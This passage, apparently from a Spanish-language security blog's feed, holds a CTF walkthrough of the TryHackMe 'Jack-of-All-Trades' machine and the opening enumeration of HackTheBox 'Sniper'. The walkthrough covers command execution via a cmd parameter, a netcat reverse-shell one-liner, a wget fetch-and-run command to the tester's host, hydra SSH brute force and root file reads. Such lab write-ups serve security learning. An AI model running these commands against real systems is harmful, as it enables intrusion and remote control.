&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Apr  8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10.10.111.123&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.111.123
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Jack-of-all-trades!
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssh-hostkey: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  ssh     OpenSSH 6.7p1 Debian &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Apr  8 17:57:19 2020 -- 1 IP address (1 host up) scanned in 76.06 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;center&gt;
&lt;img src=&#34;https://www.meme-arsenal.com/memes/d144a9109c5f5d18e37788f768fc6f95.jpg&#34; alt=&#34;drawing&#34; width=&#34;400&#34;/&gt;
&lt;/center&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Al visitar el puerto 80 nos muestra un error nuestro navegador.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2016.59.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La IP esta activa, solo el puerto en el que esta corriendo Apache es el 22 y no el 80, se puede configurar el puerto en firefox dentro de &lt;code&gt;about:config&lt;/code&gt; creando un &lt;a href=&#34;https://support.mozilla.org/en-US/questions/1083282&#34;&gt;&lt;strong&gt;string de configuracion&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.01.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora si podemos visitar la pagina y nos muestra lo siguiente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.02.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/jack-of-All-Trades# gobuster dir -u http://10.10.111.123:22/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt -q
/.htpasswd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/.htpasswd.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/.htpasswd.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/.htpasswd.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/.hta &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/.hta.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/.hta.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/.hta.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/recovery.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@upset:~/thm/jack-of-All-Trades#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el index de la pagina encontramos varias cosas interesantes en el codigo fuente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.05.38.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos un comentario que al decodificarlo en base64 nos muestra un mensaje.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.08.48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos dirigimos a &lt;strong&gt;/recovery.php&lt;/strong&gt; e intentamos utilizar la contraseña con &lt;code&gt;Johny Grave&lt;/code&gt; y combinacion del nombre pero no nos deja ingresar.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.10.49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos en el codigo fuente una string codificada.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Utilizamos base32 y hex para decodificar la cadena, lo cual nos devuelve una nueva cadena cifrada, esta vez al parecer es Caesar Cipher.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.15.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.dcode.fr/caesar-cipher&#34;&gt;&lt;strong&gt;dcode.fr tiene una herramienta&lt;/strong&gt;&lt;/a&gt; muy util que nos ayudó a decifrar el mensaje, CAesar Cipher.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.17.09.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El link que nos menciona el mensaje nos redirige a una pagina de wikipedia con el nombre de &lt;code&gt;Stegosauria&lt;/code&gt;, si recordamos en el index hay una imagen con un nombre parecido. Intentamos con steganografia en la imagen utilizando &lt;code&gt;steghide&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.20.51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos un archivo que nos indica que vamos por buen camino pero la imagen no es la correcta. Hacemos lo mismo con las otras dos imagenes del index, y obtuvimos un archivo con credenciales en la imagen &lt;strong&gt;header.jpg&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.23.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ingresamos al panel de &lt;strong&gt;/recovery.php&lt;/strong&gt; y vemos un mensaje.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.24.45.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Le pasamos un comando al parametro &lt;code&gt;cmd&lt;/code&gt; y logramos ejecutar el comando.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2017.25.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que podemos ejecutar comandos, utilizamos esta ventaja para obtener una shell inversa, primero creamos un archivo el que contenga nuestro comando para nuestra shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.8.1.72 1338 &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Creamos un pequeño servidor http con python3 &lt;code&gt;python3 -m http.server 80&lt;/code&gt;. Ejecutamos el siguiente comando para obtener nuestra shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bash -c  &amp;quot;$(wget -qO- 10.8.1.72/shell.sh)&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y ponemos a la escucha netcat en nuestra maquina &lt;code&gt;rlwrap nc -lvp 1338&lt;/code&gt; y obtenemos nuestra shell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2018.05.44.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---jack&#34;&gt;USER - JACK&lt;/h2&gt;
&lt;p&gt;Dentro del directorio /home encontramos una lista de posibles contraseñas que parecen ser del usuario jack.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2018.07.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos hydra con la lista de posibles contraseñas en el servicio SSH utilizando el puerto 80, logramos encontrar la contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2018.22.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos ssh y obtenemos una shell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2018.23.53.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos una imagen, la pasamos a nuestra maquina con netcat, abrimos la imagen y vemos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2018.32.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Enumeramos los binarios que puedan ayudar a obtener una shell con privilegios root, encontramos strings con el cual podemos leer archivos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2018.38.43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;strings&lt;/code&gt; para obtener nuestra flag &lt;strong&gt;/root/root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jackofalltrades/Screenshot%20from%202020-04-08%2018.46.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/jackofalltrades/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/jackofalltrades/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Sniper</title>
        <link>https://sckull.github.io/posts/sniper/</link>
        <pubDate>Sat, 28 Mar 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 28 Mar 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/sniper/</guid>
        <description>Sniper es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Sniper es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Sniper&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.151&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8308&#34;&gt;MinatoTW&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8308&#34;&gt;felamos &lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y servicios con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-15 18:34:38 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 80/tcp on 10.10.10.151                                    
Discovered open port 135/tcp on 10.10.10.151                                   
Discovered open port 49667/tcp on 10.10.10.151                                 
Discovered open port 139/tcp on 10.10.10.151

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Jan 15 12:30:50 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.151&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.151
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65530&lt;/span&gt; filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: 8h01m11s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-01-16T02:36:27
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Jan 15 12:35:53 2020 -- 1 IP address (1 host up) scanned in 303.66 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;En el puerto 80 corriendo IIS con una pagina web.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200115_124016.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Escaneo de directorios y archivos con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x asp,aspx,php,html,txt -q
/Blog &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/blog &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/user &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;blog&#34;&gt;/blog/&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
